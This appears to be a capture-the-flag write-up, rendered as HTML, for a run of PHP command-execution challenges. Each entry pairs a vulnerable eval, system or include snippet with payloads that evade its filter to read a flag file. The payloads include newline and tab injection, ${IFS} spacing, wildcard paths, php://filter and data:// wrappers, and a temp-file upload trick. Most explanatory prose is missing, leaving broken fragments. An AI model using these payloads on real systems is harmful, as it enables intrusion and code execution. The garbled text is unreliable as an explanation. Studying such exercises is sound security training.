tac  cat <br>tail:<br>nl<br>od:<br>vi:<br>vim:<br>sort:<br>uniq:<br>file -f:<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;</em></p><p>%09<br>get**?c&#x3D;passthru(ls);**<br><img src="https://img-blog.csdnimg.cn/b63bb7e45461489299cab133c3bc4d75.png" alt="31"><br>**?c&#x3D;passthru(tac%09fla*);<em><em>flag<br><strong></strong><br>       1 &gt;evalpassthru %09<br>%09 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(tac%09fla</em>); &amp;<br>       2&gt; pos(localeconv)<br><strong>localeconv</strong></em><em>pos<strong> <strong>scandir</strong> <strong>?c&#x3D;print_r(scandir(pos(localeconv())));</strong> flag.php </strong>array_reverse<strong>nextflag.php </strong>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));*</em></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php:<br>**?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php**<br>base64:<br><em>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7ODUxZjI3ZjgtNWY5Yy00YTZhLTg5NjctNjIwMzUwNDhmZWMwfSI7DQo&#x3D;</em><br>,</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:49:19# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//flag</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//.php</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagdata**?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla\g.php");?>**<br>flag</p><h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\|\|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**()** **;**:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p><p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong>  <strong>highlight_file</strong> <br>flag</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre><code>&gt;/dev/null 2&gt;&amp;1&gt;11&gt;/dev/null 2&gt;&amp;121shell</code></pre></blockquote><p> <br><code>?c=ls;ls()</code><br>flag.php<br><code>?c=tac flag.php;</code><br>flag<br><img src="https://img-blog.csdnimg.cn/2df7d753a2be42d4b6167d2f62e641a9.png" alt="42"><br><strong>linux&gt;&#x2F;dev&#x2F;null 2&gt;&amp;12&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</strong><a href="https://www.cnblogs.com/kexianting/p/11630085.html"></a></p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>web42cat</p><blockquote><p><br>%26   %0a   ||<br>cat:<br>tac tail nl  sort  uniqhead more less</p></blockquote><p><br><code>?c=tac flag.php%0a</code><br>flag<br><img src="https://img-blog.csdnimg.cn/cd8e9c47e22b4d2186c3b65831fd18ed.png" alt="43"></p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p><code>?c=tac fla\g.php%0a</code><br>flagfla?.phpfla*fla\g.php<br><img src="https://img-blog.csdnimg.cn/cd533af3fd0546499f6ec5c5ccab36ab.png" alt="44"></p><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p></p><blockquote><p><br>%09<br>%20<br>$IFS<br>${IFS}<br>$IFS$9<br>&lt;<br>&lt;&gt;</p></blockquote><p><br><code>?c=tac%09fl\ag.php%26</code><br><img src="https://img-blog.csdnimg.cn/ef07d9f8a7de4bb3a1f66651f7927080.png" alt="45"></p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>*$<br><code>?c=tac%09fl\ag.php%26</code>%09%26%09%26</p><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p><code>?c=tac%09fl\ag.php%26</code></p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p><code>?c=tac%09fl\ag.php%26</code></p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p><code>?c=tac%09fl\ag.php%26</code></p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>\x09\x26%09%26url\t&amp;<br>nl<code>?c=nl&lt;&gt;fl\ag.php%0a</code>flag<br><img src="https://img-blog.csdnimg.cn/2711a133cca1468d9c6abf47edf4c596.png" alt="50"></p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>nl<code>?c=nl&lt;&gt;fl\ag.php%0a</code>flag</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;$<br><br><img src="https://img-blog.csdnimg.cn/f6af93b9f8184e2fac3ac26887309258.png" alt="51"><br>flag<br><img src="https://img-blog.csdnimg.cn/d42ab57d32d045f280099f2d39ade197.png" alt="52"></p><p></p><p><img src="https://img-blog.csdnimg.cn/5239125221384771978e45ffa48aa32a.png" alt="52"></p><p>flag<br></p><p><img src="https://img-blog.csdnimg.cn/a0f0ec1b687a4c9bb9c58262da2c2893.png" alt="52"><br>flag<br><img src="https://img-blog.csdnimg.cn/84c0438b30b645e3b9aa4f2fe6d86feb.png" alt="52"></p><p></p><p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p><p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p><p><code>?c=ls /;</code>&#x2F;flag<br>flag.txt<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>b.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>flag<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>tactact\ac<br><code>ls%0a</code><br><img src="https://img-blog.csdnimg.cn/c3df993696314026bf5e3f09c92bfed2.png" alt="53"><br><code>ta\c$&#123;IFS&#125;fl\ag.php%0a</code>flag<br><img src="https://img-blog.csdnimg.cn/83fd360699064877aa18112049e00594.png" alt="53"></p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//|.*c.*a.*t.*|cat catc""at</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?c=ls%0a</code><br><img src="https://img-blog.csdnimg.cn/bc99561bcda249aeb4dcd6bfb536e88a.png" alt="54"><br><code>/?c=t&#39;&#39;ac$&#123;IFS&#125;fl??.php%0a</code>flag.php<code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;c.txt</code>c.txtflag<br><img src="https://img-blog.csdnimg.cn/e0c0b3fb362541a494d84e24c336876c.png" alt="54"></p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>64base64<code>/bin/base64 flag.php</code><code>/???/????64 ????.???</code><br><img src="https://img-blog.csdnimg.cn/aede99d5d50a4c958806d913e1a910e4.png" alt="55"><br><br><img src="https://img-blog.csdnimg.cn/39f6b55ee217431cb0f50b6b5fab570f.png" alt="55"><br> <br> &#x2F;bin</p><blockquote><p>catcpchmod dfdmesggzipkilllsmkdirmoremountrmsutarbase64</p></blockquote><p> <strong></strong></p><p>wp,bzip2<a href="https://blog.csdn.net/qq313088385/article/details/114382259"></a></p><blockquote><p> bzip2<br> a block-sorting file compressor<br> <br> &#x2F;usr&#x2F;bin&#x2F;bzip2<br> </p></blockquote><p>flag.php <br>payload?c&#x3D;&#x2F;???&#x2F;???&#x2F;???2 ????.???<br>&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php<br>&#x2F;flag.php.bz2flag.php</p><p><strong></strong></p><p><a href="https://blog.csdn.net/snowlyzz/article/details/125051503"></a></p><p>  ? &#x2F; . (,)<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p><p> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTPOC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0bb2c3a2-2646-491d-80fa-52c6bee9decc.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!----></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POSTPHP&#x2F;tmp&#x2F;phpXXXXXX6[@-[],</p><p>php<br>poc</p><blockquote><p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p></blockquote><p>[@-[]linux<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>36flag<br><img src="https://img-blog.csdnimg.cn/cbc6e031f9034562a1fac4c51868d50f.png" alt="57">36<br>shelllinux shell</p><p><code>$(())</code>0<br><code>$((~$(())))</code> 0-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1(-1)+(-1)-2-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code>-211<br>a-(a+1)0-1<br>37-1<br>payload</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">data</span> = <span class="token string">"$((~$(("</span><span class="token operator">+</span><span class="token string">"$((~<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>)))"</span><span class="token operator">*</span>37+<span class="token string">"))))"</span>print<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/1dfc1bd03f634f0a8ac2897860397df8.png" alt="57"><br><br><img src="https://img-blog.csdnimg.cn/2229ad05e7d44402a9129cac3b7498bf.png" alt="57"></p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>postc</p><p><img src="https://img-blog.csdnimg.cn/d4deb1dd5ef34b2e8119e315fcb326aa.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/b95d371722ed4cff845d0949b4ec7129.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/9bdfc6036b5244c089d74c881fcdf78d.png" alt="58"></p><p><strong></strong><br>post<br><code>c=passthru(&quot;ls&quot;);``c=system(&quot;ls&quot;);</code><br><img src="https://img-blog.csdnimg.cn/8067867549014691beb5f8863079e2d3.png" alt="58"><br></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">highlight_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>show_source<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>php_strip_whitespace<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>readfile<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> var_dumpfread<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> phpinclude_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> phprequire<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> phprequire_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> phpprint_r<span class="token punctuation">(</span>fread<span class="token punctuation">(</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>fgets<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> fpassthru<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>  EOFprint_r<span class="token punctuation">(</span>fgetcsv<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>fgetss<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>  HTML print_r<span 